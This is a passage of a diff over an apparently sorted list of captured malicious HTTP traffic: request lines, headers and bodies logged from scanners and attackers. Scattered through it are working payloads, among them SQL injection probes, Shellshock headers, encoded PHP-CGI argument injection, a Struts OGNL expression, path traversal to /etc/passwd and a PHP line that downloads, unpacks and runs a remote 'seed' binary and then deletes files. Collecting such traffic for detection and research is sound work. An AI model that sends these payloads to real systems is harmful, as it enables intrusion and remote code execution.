-GET /index.php?pg=%27%20OR%20sqlspider HTTP/1.1\
-GET /index.php?pollname=%27%20OR%20sqlspider HTTP/1.1\
-GET /index.php?sub=%27%20OR%20sqlspider HTTP/1.1\
-GET /index.php?u=administrator%2fcomponents%2fcom_linkdirectory%2ftoolbar%2elinkdirectory%2ehtml%2ephp%3fmosConfig_absolute_path%3d%27%20OR%20sqlspider HTTP/1.1\
-GET /index.php?visualizar=%27%20OR%20sqlspider HTTP/1.1\
-GET /index.php?where=%27%20OR%20sqlspider HTTP/1.1\
+GET /include/write.php?dir=%27%20OR%20sqlspider HTTP/1.1\
 GET /index1.php?adresa=%27%20OR%20sqlspider HTTP/1.1\
 GET /index1.php?home=%27%20OR%20sqlspider HTTP/1.1\
 GET /index1.php?incl=%27%20OR%20sqlspider HTTP/1.1\
@@ -394,24 +363,53 @@ GET /index1.php?showpage=%27%20OR%20sqlspider HTTP/1.1\
 GET /index1.php?site=%27%20OR%20sqlspider HTTP/1.1\
 GET /index1.php?strona=%27%20OR%20sqlspider HTTP/1.1\
 GET /index1.php?type=%27%20OR%20sqlspider HTTP/1.1\
-GET /index2.php?OpenPage=%27%20OR%20sqlspider HTTP/1.1\
 GET /index2.php?action=%27%20OR%20sqlspider HTTP/1.1\
 GET /index2.php?ki=%27%20OR%20sqlspider HTTP/1.1\
 GET /index2.php?load=%27%20OR%20sqlspider HTTP/1.1\
 GET /index2.php?loader=%27%20OR%20sqlspider HTTP/1.1\
 GET /index2.php?module=%27%20OR%20sqlspider HTTP/1.1\
+GET /index2.php?OpenPage=%27%20OR%20sqlspider HTTP/1.1\
 GET /index2.php?param=%27%20OR%20sqlspider HTTP/1.1\
 GET /index2.php?pre=%27%20OR%20sqlspider HTTP/1.1\
 GET /index2.php?showpage=%27%20OR%20sqlspider HTTP/1.1\
 GET /index2.php?type=%27%20OR%20sqlspider HTTP/1.1\
 GET /index3.php?addr=%27%20OR%20sqlspider HTTP/1.1\
-GET /index3.php?channel= HTTP/1.1\
 GET /index3.php?channel=%27%20OR%20sqlspider HTTP/1.1\
+GET /index3.php?channel= HTTP/1.1\
 GET /index3.php?chapter=%27%20OR%20sqlspider HTTP/1.1\
 GET /index3.php?pageweb=%27%20OR%20sqlspider HTTP/1.1\
 GET /index3.php?pref=%27%20OR%20sqlspider HTTP/1.1\
 GET /index3.php?t=%27%20OR%20sqlspider HTTP/1.1\
 GET /index_en.php?id=%27%20OR%20sqlspider HTTP/1.1\
+GET /index.inc.php?PATH_Includes=%27%20OR%20sqlspider HTTP/1.1\
+GET /index.php?addr=%27%20OR%20sqlspider HTTP/1.1\
+GET /index.php?configFile=%27%20OR%20sqlspider HTTP/1.1\
+GET /index.php?conteudo=%27%20OR%20sqlspider HTTP/1.1\
+GET /index.php?cPath=%27%20OR%20sqlspider HTTP/1.1\
+GET /index.php?data_id=%27%20OR%20sqlspider HTTP/1.1\
+GET /index.php?disp=%27%20OR%20sqlspider HTTP/1.1\
+GET /index.php?filename=%27%20OR%20sqlspider HTTP/1.1\
+GET /index.php?filepath=%27%20OR%20sqlspider HTTP/1.1\
+GET /index.php HTTP/1.1\
+GET /index.php?id_categoria=%27%20OR%20sqlspider HTTP/1.1\
+GET /index.php?inc=%27%20OR%20sqlspider HTTP/1.1\
+GET /index.php?inhalt=%27%20OR%20sqlspider HTTP/1.1\
+GET /index.php?lang=%27%20OR%20sqlspider HTTP/1.1\
+GET /index.php?nic=%27%20OR%20sqlspider HTTP/1.1\
+GET /index.php?opcao=%27%20OR%20sqlspider HTTP/1.1\
+GET /index.php?opcion=%27%20OR%20sqlspider HTTP/1.1\
+GET /index.php?pagename=%27%20OR%20sqlspider HTTP/1.1\
+GET /index.php?pg=%27%20OR%20sqlspider HTTP/1.1\
+GET /index.php?pollname=%27%20OR%20sqlspider HTTP/1.1\
+GET /index.php?_REQUEST=%27%20OR%20sqlspider&GLOBALS=&mosConfig_absolute_path=&_REQUEST%5boption%5d=com_content&_REQUEST%5bItemid%5d=1 HTTP/1.1\
+GET /index.php?_REQUEST=&GLOBALS=%27%20OR%20sqlspider&mosConfig_absolute_path=&_REQUEST%5boption%5d=com_content&_REQUEST%5bItemid%5d=1 HTTP/1.1\
+GET /index.php?_REQUEST=&GLOBALS=&mosConfig_absolute_path=%27%20OR%20sqlspider&_REQUEST%5boption%5d=com_content&_REQUEST%5bItemid%5d=1 HTTP/1.1\
+GET /index.php?_REQUEST=&GLOBALS=&mosConfig_absolute_path=&_REQUEST%5boption%5d=com_content%27%20OR%20sqlspider&_REQUEST%5bItemid%5d=1 HTTP/1.1\
+GET /index.php?_REQUEST=&GLOBALS=&mosConfig_absolute_path=&_REQUEST%5boption%5d=com_content&_REQUEST%5bItemid%5d=1%27%20OR%20sqlspider HTTP/1.1\
+GET /index.php?sub=%27%20OR%20sqlspider HTTP/1.1\
+GET /index.php?u=administrator%2fcomponents%2fcom_linkdirectory%2ftoolbar%2elinkdirectory%2ehtml%2ephp%3fmosConfig_absolute_path%3d%27%20OR%20sqlspider HTTP/1.1\
+GET /index.php?visualizar=%27%20OR%20sqlspider HTTP/1.1\
+GET /index.php?where=%27%20OR%20sqlspider HTTP/1.1\
 GET /info.php?adresa=%27%20OR%20sqlspider HTTP/1.1\
 GET /info.php?eval=%27%20OR%20sqlspider HTTP/1.1\
 GET /info.php?header=%27%20OR%20sqlspider HTTP/1.1\
@@ -421,14 +419,15 @@ GET /info.php?menue=%27%20OR%20sqlspider HTTP/1.1\
 GET /info.php?o=%27%20OR%20sqlspider HTTP/1.1\
 GET /informacion.php?info=%27%20OR%20sqlspider HTTP/1.1\
 GET /invoker/JMXInvokerServlet HTTP/1.1\
-GET /jmx-console/ HTTP/1.1\
 GET /jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo HTTP/1.1\
+GET /jmx-console/ HTTP/1.1\
 GET /layout.php?category=%27%20OR%20sqlspider HTTP/1.1\
 GET /layout.php?choix=%27%20OR%20sqlspider HTTP/1.1\
 GET /layout.php?goto=%27%20OR%20sqlspider HTTP/1.1\
 GET /layout.php?numero=%27%20OR%20sqlspider HTTP/1.1\
 GET /layout.php?oldal=%27%20OR%20sqlspider HTTP/1.1\
 GET /learnmore.asp?cartID=%27%20OR%20sqlspider HTTP/1.1\
+GET /Listadeparametros.html HTTP/1.1\
 GET /loadpsb.php?id=%27%20OR%20sqlspider HTTP/1.1\
 GET /main.php?goto=%27%20OR%20sqlspider HTTP/1.1\
 GET /main.php?inc=%27%20OR%20sqlspider HTTP/1.1\
@@ -441,10 +440,10 @@ GET /main.php?type=%27%20OR%20sqlspider HTTP/1.1\
 GET /main.php?xlink=%27%20OR%20sqlspider HTTP/1.1\
 GET /manager/html HTTP/1.1\
 GET /material.php?id=%27%20OR%20sqlspider HTTP/1.1\
-GET /mod%2A.php?OpenPage=%27%20OR%20sqlspider HTTP/1.1\
 GET /mod%2A.php?content=%27%20OR%20sqlspider HTTP/1.1\
 GET /mod%2A.php?ir=%27%20OR%20sqlspider HTTP/1.1\
 GET /mod%2A.php?m=%27%20OR%20sqlspider HTTP/1.1\
+GET /mod%2A.php?OpenPage=%27%20OR%20sqlspider HTTP/1.1\
 GET /mod%2A.php?qry=%27%20OR%20sqlspider HTTP/1.1\
 GET /mod%2A.php?section=%27%20OR%20sqlspider HTTP/1.1\
 GET /mod%2A.php?thispage=%27%20OR%20sqlspider HTTP/1.1\
@@ -452,11 +451,17 @@ GET /modline.asp?id=%27%20OR%20sqlspider HTTP/1.1\
 GET /modules/4nAlbum/public/displayCategory.php?basepath=%27%20OR%20sqlspider HTTP/1.1\
 GET /modules/vwar/admin/admin.php?vwar_root=index%2ephp%3floc%3d%27%20OR%20sqlspider HTTP/1.1\
 GET /muieblackcat HTTP/1.1\
+GET //myadmin/scripts/setup.php HTTP/1.1\
+GET //MyAdmin/scripts/setup.php HTTP/1.1\
 GET /myevent.php?myevent_path=%27%20OR%20sqlspider HTTP/1.1\
-GET /news.php?kind=%27%20OR%20sqlspider HTTP/1.1\
 GET /newsone.php?id=%27%20OR%20sqlspider HTTP/1.1\
+GET /news.php?kind=%27%20OR%20sqlspider HTTP/1.1\
+GET /Nmap/folder/check1448289400 HTTP/1.1\
+GET /Nmap/folder/check1448289401 HTTP/1.1\
 GET /nmaplowercheck1448289400 HTTP/1.1\
 GET /nmaplowercheck1448289401 HTTP/1.1\
+GET /NmapUpperCheck1448289400 HTTP/1.1\
+GET /NmapUpperCheck1448289401 HTTP/1.1\
 GET /nota.php?category=%27%20OR%20sqlspider HTTP/1.1\
 GET /nota.php?disp=%27%20OR%20sqlspider HTTP/1.1\
 GET /nota.php?eval=%27%20OR%20sqlspider HTTP/1.1\
@@ -474,8 +479,8 @@ GET /ogl_inet.php?ogl_id=%27%20OR%20sqlspider HTTP/1.1\
 GET /opinions.php?id=%27%20OR%20sqlspider HTTP/1.1\
 GET /padrao.php?a=%27%20OR%20sqlspider HTTP/1.1\
 GET /padrao.php?abre=%27%20OR%20sqlspider HTTP/1.1\
-GET /padrao.php?loc= HTTP/1.1\
 GET /padrao.php?loc=%27%20OR%20sqlspider HTTP/1.1\
+GET /padrao.php?loc= HTTP/1.1\
 GET /padrao.php?middle=%27%20OR%20sqlspider HTTP/1.1\
 GET /padrao.php?oldal=%27%20OR%20sqlspider HTTP/1.1\
 GET /padrao.php?op=%27%20OR%20sqlspider HTTP/1.1\
@@ -484,16 +489,16 @@ GET /padrao.php?pre=%27%20OR%20sqlspider HTTP/1.1\
 GET /padrao.php?read=%27%20OR%20sqlspider HTTP/1.1\
 GET /padrao.php?seite=%27%20OR%20sqlspider HTTP/1.1\
 GET /page.asp?PartID=%27%20OR%20sqlspider HTTP/1.1\
-GET /page.php?OpenPage=%27%20OR%20sqlspider HTTP/1.1\
+GET /pagedisplay.php?id=%27%20OR%20sqlspider HTTP/1.1\
 GET /page.php?choix=%27%20OR%20sqlspider HTTP/1.1\
 GET /page.php?cmd=%27%20OR%20sqlspider HTTP/1.1\
 GET /page.php?eval=%27%20OR%20sqlspider HTTP/1.1\
 GET /page.php?numero=%27%20OR%20sqlspider HTTP/1.1\
 GET /page.php?oldal=%27%20OR%20sqlspider HTTP/1.1\
+GET /page.php?OpenPage=%27%20OR%20sqlspider HTTP/1.1\
 GET /page.php?p=%27%20OR%20sqlspider HTTP/1.1\
 GET /page.php?read=%27%20OR%20sqlspider HTTP/1.1\
 GET /page.php?z=%27%20OR%20sqlspider HTTP/1.1\
-GET /pagedisplay.php?id=%27%20OR%20sqlspider HTTP/1.1\
 GET /pagina.php?mid=%27%20OR%20sqlspider HTTP/1.1\
 GET /pagina.php?middlePart=%27%20OR%20sqlspider HTTP/1.1\
 GET /pagina.php?pagina=%27%20OR%20sqlspider HTTP/1.1\
@@ -511,7 +516,11 @@ GET /payment.asp?CartID=%27%20OR%20sqlspider HTTP/1.1\
 GET /person.php?id=%27%20OR%20sqlspider HTTP/1.1\
 GET /photoalb/lib/static/header.php?set_menu=%27%20OR%20sqlspider HTTP/1.1\
 GET /phpmyadmin/scripts/setup.php HTTP/1.0\
+GET //phpmyadmin/scripts/setup.php HTTP/1.1\
+GET //phpMyAdmin/scripts/setup.php HTTP/1.1\
+GET //PHPMyAdmin/scripts/setup.php HTTP/1.1\
 GET /phpopenchat/contrib/yabbse/poc.php?sourcedir=%27%20OR%20sqlspider HTTP/1.1\
+GET //pma/scripts/setup.php HTTP/1.1\
 GET /points.php?id=%27%20OR%20sqlspider HTTP/1.1\
 GET /press.php?ir=%27%20OR%20sqlspider HTTP/1.1\
 GET /press.php?middle=%27%20OR%20sqlspider HTTP/1.1\
@@ -535,13 +544,13 @@ GET /print.php?pname=%27%20OR%20sqlspider HTTP/1.1\
 GET /print.php?r=%27%20OR%20sqlspider HTTP/1.1\
 GET /print.php?read=%27%20OR%20sqlspider HTTP/1.1\
 GET /print.php?sp=%27%20OR%20sqlspider HTTP/1.1\
-GET /prodView.asp?idProduct=%27%20OR%20sqlspider HTTP/1.1\
 GET /prod_info.php?id=%27%20OR%20sqlspider HTTP/1.1\
 GET /prodotti.php?idcategoria=%27%20OR%20sqlspider HTTP/1.1\
 GET /product.asp?bookID=%27%20OR%20sqlspider HTTP/1.1\
-GET /product.php?id=%27%20OR%20sqlspider HTTP/1.1\
 GET /productinfo.asp?item=%27%20OR%20sqlspider HTTP/1.1\
+GET /product.php?id=%27%20OR%20sqlspider HTTP/1.1\
 GET /productsByCategory.asp?intCatalogID=%27%20OR%20sqlspider HTTP/1.1\
+GET /prodView.asp?idProduct=%27%20OR%20sqlspider HTTP/1.1\
 GET /proposte.php?id=%27%20OR%20sqlspider HTTP/1.1\
 GET /recension.php?id=%27%20OR%20sqlspider HTTP/1.1\
 GET /recruit_details.php?id=%27%20OR%20sqlspider HTTP/1.1\
@@ -553,9 +562,9 @@ GET /seccion.php?id=%27%20OR%20sqlspider HTTP/1.1\
 GET /seccoes.php?seccao=%27%20OR%20sqlspider HTTP/1.1\
 GET /services.php?page=%27%20OR%20sqlspider HTTP/1.1\
 GET /servicios.php?id=%27%20OR%20sqlspider HTTP/1.1\
-GET /shop.cgi HTTP/1.1\
 GET /shopbasket.asp?bookid=%27%20OR%20sqlspider HTTP/1.1\
 GET /shopbycategory.asp?catid=%27%20OR%20sqlspider HTTP/1.1\
+GET /shop.cgi HTTP/1.1\
 GET /shopping_basket.asp?cartID=%27%20OR%20sqlspider HTTP/1.1\
 GET /shopreviewlist.asp?id=%27%20OR%20sqlspider HTTP/1.1\
 GET /show.php?adresa=%27%20OR%20sqlspider HTTP/1.1\
@@ -604,10 +613,11 @@ GET /start.php?o=%27%20OR%20sqlspider HTTP/1.1\
 GET /start.php?oldal=%27%20OR%20sqlspider HTTP/1.1\
 GET /start.php?p=%27%20OR%20sqlspider HTTP/1.1\
 GET /start.php?pname=%27%20OR%20sqlspider HTTP/1.1\
-GET /start.php?str= HTTP/1.1\
 GET /start.php?str=%27%20OR%20sqlspider HTTP/1.1\
+GET /start.php?str= HTTP/1.1\
 GET /status.cgi?host=all%27%20OR%20sqlspider HTTP/1.1\
 GET /store_bycat.asp?id=%27%20OR%20sqlspider HTTP/1.1\
+GET /Stray-Questions-View.php?num=%27%20OR%20sqlspider HTTP/1.1\
 GET /sub%2A.php?abre=%27%20OR%20sqlspider HTTP/1.1\
 GET /sub%2A.php?adresa=%27%20OR%20sqlspider HTTP/1.1\
 GET /sub%2A.php?basepath=%27%20OR%20sqlspider HTTP/1.1\
@@ -620,8 +630,8 @@ GET /sub%2A.php?rub=%27%20OR%20sqlspider HTTP/1.1\
 GET /sub%2A.php?seite=%27%20OR%20sqlspider HTTP/1.1\
 GET /system/user/scn_user_list HTTP/1.1\
 GET /tekst.php?idt=%27%20OR%20sqlspider HTTP/1.1\
-GET /tema.php?id= HTTP/1.1\
 GET /tema.php?id=%27%20OR%20sqlspider HTTP/1.1\
+GET /tema.php?id= HTTP/1.1\
 GET /temas.php?ID=%27%20OR%20sqlspider HTTP/1.1\
 GET /temp_eg/phpgwapi/setup/tables_update.inc.php?appdir=%27%20OR%20sqlspider HTTP/1.1\
 GET /template.php?a=%27%20OR%20sqlspider HTTP/1.1\
@@ -639,41 +649,29 @@ GET /transcript.php?id=%27%20OR%20sqlspider HTTP/1.1\
 GET /updatebasket.asp?bookid=%27%20OR%20sqlspider HTTP/1.1\
 GET /user/soapCaller.bs HTTP/1.1\
 GET /util_gw.js HTTP/1.0\
+GET /viewCart.asp?userID=%27%20OR%20sqlspider HTTP/1.1\
 GET /view.php?incl=%27%20OR%20sqlspider HTTP/1.1\
 GET /view.php?lang=%27%20OR%20sqlspider HTTP/1.1\
 GET /view.php?oldal=%27%20OR%20sqlspider HTTP/1.1\
 GET /view.php?second=%27%20OR%20sqlspider HTTP/1.1\
-GET /view.php?showpage= HTTP/1.1\
 GET /view.php?showpage=%27%20OR%20sqlspider HTTP/1.1\
+GET /view.php?showpage= HTTP/1.1\
 GET /view.php?u=%27%20OR%20sqlspider HTTP/1.1\
-GET /viewCart.asp?userID=%27%20OR%20sqlspider HTTP/1.1\
+GET //_vti_inf.html HTTP/1.1\
 GET /web-console/ServerInfo.jsp HTTP/1.1\
 GET /whatsnew.asp?idCategory=%27%20OR%20sqlspider HTTP/1.1\
 GET /wordpress//wp-login.php HTTP/1.1\
+GET //wp-login.php HTTP/1.1\
 GET /wp-login.php HTTP/1.1\
 GET /wp//wp-login.php HTTP/1.1\
 GET /x HTTP/1.1\
+GET /XMII/Illuminator HTTP/1.0
 GET /zimbra/res/I18nMsg\,AjxMsg\,ZMsg\,ZmMsg\,AjxKeys\,ZmKeys\,ZdMsg\,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../dev/null%00 HTTP/1.1\
 GET /zimbra/res/I18nMsg\,AjxMsg\,ZMsg\,ZmMsg\,AjxKeys\,ZmKeys\,ZdMsg\,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../etc/passwd%00 HTTP/1.1\
-GET HTTP://www.baidu.com/ HTTP/1.1\
-GET http://162.252.240.124:80/gw.php HTTP/1.1\
-GET http://24x7-allrequestsallowed.com/?PHPSESSID=aab45f4f00143PWPJWTGYCMZJ%40%5B HTTP/1.1\
-GET http://24x7-allrequestsallowed.com/?PHPSESSID=tt2adea600143PWPJWTGYCMZJ%40%5B HTTP/1.1\
-GET http://51.254.206.142/httptest.php HTTP/1.1\
-GET http://testp2.czar.bielawa.pl/testproxy.php HTTP/1.1\
-GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1\
-GET http://testp4.pospr.waw.pl/testproxy.php HTTP/1.1\
-GET http://testp5.mielno.lubin.pl/testproxy.php HTTP/1.1\
-GET http://www.baidu.com/robots.txt HTTP/1.1\
-GET http://www.google.pl/search?q=wczasy&num=100&start=100 HTTP/1.1\
-GET http://www.ip.cn HTTP/1.1\
-GET http://www.wikipedia.org/ HTTP/1.1\
-GET https://m.baidu.com/ HTTP/1.1\
 HEAD / HTTP/1.0
 HEAD / HTTP/1.1\
-HEAD /rom-0 HTTP/1.1\
 HEAD http://www.baidu.com/ HTTP/1.1\
-Host: -h\
+HEAD /rom-0 HTTP/1.1\
 Host: 153.126.192.79
 Host: 153.126.192.79\
 Host: 153.126.192.79:269549168\
@@ -684,6 +682,7 @@ Host: 162.252.240.124\
 Host: 24x7-allrequestsallowed.com\
 Host: 51.254.206.142\
 Host: dns.aegins.com\
+Host: -h\
 Host: ik1-332-26075.vs.sakura.ne.jp
 Host: ik1-332-26075.vs.sakura.ne.jp\
 Host: localhost\
@@ -699,37 +698,53 @@ Host: www.google.pl\
 Host: www.ik1-332-26075.vs.sakura.ne.jp
 Host: www.ip.cn\
 Host: www.wikipedia.org\
+login=%27%20OR%20sqlspider
+login=ghz%3ehzx
+login=hzx%22zxc
+login=zxc%27xcv
+nmap\
 OPTIONS / HTTP/1.1\
-POST / HTTP/1.1\
-POST //cgi-bin/php?%2d%64+%61%6c%6c%6f%77%5f%75%72%6c%5f%69%6e%63%6c%75%64%65%3d%6f%6e+%2d%64+%73%61%66%65%5f%6d%6f%64%65%3d%6f%66%66+%2d%64+%73%75%68%6f%73%69%6e%2e%73%69%6d%75%6c%61%74%69%6f%6e%3d%6f%6e+%2d%64+%64%69%73%61%62%6c%65%5f%66%75%6e%63%74%69%6f%6e%73%3d%22%22+%2d%64+%6f%70%65%6e%5f%62%61%73%65%64%69%72%3d%6e%6f%6e%65+%2d%64+%61%75%74%6f%5f%70%72%65%70%65%6e%64%5f%66%69%6c%65%3d%70%68%70%3a%2f%2f%69%6e%70%75%74+%2d%64+%63%67%69%2e%66%6f%72%63%65%5f%72%65%64%69%72%65%63%74%3d%30+%2d%64+%63%67%69%2e%72%65%64%69%72%65%63%74%5f%73%74%61%74%75%73%5f%65%6e%76%3d%30+%2d%64+%61%75%74%6f%5f%70%72%65%70%65%6e%64%5f%66%69%6c%65%3d%70%68%70%3a%2f%2f%69%6e%70%75%74+%2d%6e HTTP/1.1\
-POST //index HTTP/1.1\
-POST /?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1\
-POST /cgi-bin//index HTTP/1.1\
+<?php system('echo NmapCVEIdentification');die(); ?>
 POST /cgi-bin/comments HTTP/1.1\
+POST /cgi-bin//index HTTP/1.1\
+POST //cgi-bin/php?%2d%64+%61%6c%6c%6f%77%5f%75%72%6c%5f%69%6e%63%6c%75%64%65%3d%6f%6e+%2d%64+%73%61%66%65%5f%6d%6f%64%65%3d%6f%66%66+%2d%64+%73%75%68%6f%73%69%6e%2e%73%69%6d%75%6c%61%74%69%6f%6e%3d%6f%6e+%2d%64+%64%69%73%61%62%6c%65%5f%66%75%6e%63%74%69%6f%6e%73%3d%22%22+%2d%64+%6f%70%65%6e%5f%62%61%73%65%64%69%72%3d%6e%6f%6e%65+%2d%64+%61%75%74%6f%5f%70%72%65%70%65%6e%64%5f%66%69%6c%65%3d%70%68%70%3a%2f%2f%69%6e%70%75%74+%2d%64+%63%67%69%2e%66%6f%72%63%65%5f%72%65%64%69%72%65%63%74%3d%30+%2d%64+%63%67%69%2e%72%65%64%69%72%65%63%74%5f%73%74%61%74%75%73%5f%65%6e%76%3d%30+%2d%64+%61%75%74%6f%5f%70%72%65%70%65%6e%64%5f%66%69%6c%65%3d%70%68%70%3a%2f%2f%69%6e%70%75%74+%2d%6e HTTP/1.1\
 POST /cgi-bin/php/cgin/php?%2D%64+%61%6C%75%6F%6E+%2D%64+%6D%6F%64+%2D%64+%73%75%68%6F%6E%3D%6F%6E+%2D%64+%75%6E%63%74%73%3D%22%22+%2D%64+%64%6E%65+%2D%64+%61%75%74%6F%5F%70%72%%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%74%5F%3D%30+%2D%64+%75%74+%2D%6E HTTP/1.1\
 POST /comments HTTP/1.1\
+POST /?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1\
 POST /doLogin.do HTTP/1.1\
 POST /home HTTP/1.1\
+POST / HTTP/1.1\
 POST /index.action HTTP/1.1\
+POST //index HTTP/1.1\
 POST /phpMyAdmin-2.6.4-pl1/libraries/grab_globals.lib.php HTTP/1.1\
 POST /tmUnblock.cgi HTTP/1.1\
 POST /unAuthorizedAccess.action HTTP/1.1\
 Pragma: no-cache\
+]]></probe>
+]]></probe>\
+<probe type="string"><![CDATA[\
+<probe type="yaml"><![CDATA[\
 Proxy-Connection: Close
 Proxy-Connection: Keep-Alive
 Proxy-Connection: Keep-Alive\
 Range: bytes=0-100\
-Referer: () { :;}; echo; echo "HWNDLGZZCPPYGWD"\
+redirect:${%23res%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')\,%23res.setCharacterEncoding(%22UTF-8%22)\,%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest')\,%23res.getWriter().print(%22dir:%22)\,%23res.getWriter().println(%23req.getSession().getServletContext().getRealPath(%22/%22))\,%23res.getWriter().flush()\,%23res.getWriter().close()}
 Referer: 153.126.192.79:80/invoker/JMXInvokerServlet\
 Referer: 153.126.192.79:80/web-console/ServerInfo.jsp\
+Referer: () { :;}; echo; echo "HWNDLGZZCPPYGWD"\
+Referer: http://153.126.192.79:80/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo\
 Referer: http://153.126.192.79/cgi-bin/ppdscgi.exe\
 Referer: http://153.126.192.79/cgi-bin/visadmin.exe\
-Referer: http://153.126.192.79:80/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo\
+--- !ruby/object:^@\
+--- !ruby/object:Time {}\
+<? system("cd /tmp ; wget trying.us.to/seed.jpg ; curl -O http://trying.us.to/seed.jpg ; fetch http://trying.us.to/seed.jpg ; tar -xzvf seed.jpg ; chmod +x seed ; ./seed  ; rm -rf * "); ?>
 Te: deflate\,gzip;q=0.3\
-User-Agent: () { :;}; echo; echo "HWNDLGZZCPPYGWD"\
 User-Agent: Apache-HttpClient/4.5 (Java/1.8.0_45-internal)
+User-Agent: curl/7.43.0
+User-Agent: () { :;}; echo; echo "HWNDLGZZCPPYGWD"\
 User-Agent: HttpClient
 User-Agent: Java/1.6.0_22
+User-Agent: masscan/1.0 (https://github.com/robertdavidgraham/masscan)
 User-Agent: Morfeus Fucking Scanner
 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; 360-cn-agent)
 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; InfoPath.2)
@@ -739,43 +754,28 @@ User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC
 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MDDC)
 User-Agent: Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 2Pac; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)
 User-Agent: Mozilla/5.0\
+User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
+User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; http://nmap.org/book/nse.html)
+User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML\, like Gecko) Chrome/41.0.2251.0 Safari/537.36
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML\, like Gecko) Chrome/43.0.2357.134 Safari/537.36 QQBrowser/3.8.3858.400
 User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0
 User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0
 User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1
-User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML\, like Gecko) Chrome/44.0.2403.107 Safari/537.36
 User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0
-User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML\, like Gecko) Chrome/45.0.2454.101 Safari/537.36
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML\, like Gecko) Chrome/44.0.2403.107 Safari/537.36
 User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0 Gecko/20100101 Firefox/36.0
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML\, like Gecko) Chrome/45.0.2454.101 Safari/537.36
 User-Agent: Mozilla/5.0 (X11; U; Linux i686; pt-BR; rv:1.9.0.15) Gecko/2009102815 Ubuntu/9.04 (jaunty) Firefox/3.0.15
-User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
-User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; http://nmap.org/book/nse.html)
-User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\
-User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
 User-Agent: Mozilla/5.0 zgrab/0.x
 User-Agent: Opera/9.80 (X11; Linux x86_64) Presto/2.12.388 Version/12.16
 User-Agent: Python-httplib2/0.9 (gzip)
 User-Agent: Scanning for research (researchscan.comsys.rwth-aachen.de)
 User-Agent: Telesphoreo
-User-Agent: curl/7.43.0
-User-Agent: masscan/1.0 (https://github.com/robertdavidgraham/masscan)
+usesubform[1]=1&usesubform[2]=1&subform[1][redirect]=../../../../../etc/passwd&subform[1][cXIb8O3]=1
 Via: 1.0 localhost (squid/3.4.10)\
 Via: 1.1 localhost (squid/3.4.10)\
 X-Forwarded-For: 192.168.1.157
 X-Forwarded-For: 192.168.1.157\
-\
-]]></probe>
-]]></probe>\
-a
-comment=%27%20OR%20sqlspider
-comment=ghz%3ehzx
-comment=hzx%22zxc
-comment=zxc%27xcv
-login=%27%20OR%20sqlspider
-login=ghz%3ehzx
-login=hzx%22zxc
-login=zxc%27xcv
-nmap\
-redirect:${%23res%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')\,%23res.setCharacterEncoding(%22UTF-8%22)\,%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest')\,%23res.getWriter().print(%22dir:%22)\,%23res.getWriter().println(%23req.getSession().getServletContext().getRealPath(%22/%22))\,%23res.getWriter().flush()\,%23res.getWriter().close()}
-usesubform[1]=1&usesubform[2]=1&subform[1][redirect]=../../../../../etc/passwd&subform[1][cXIb8O3]=1
+<?xml version="1.0" encoding="UTF-8"?>\
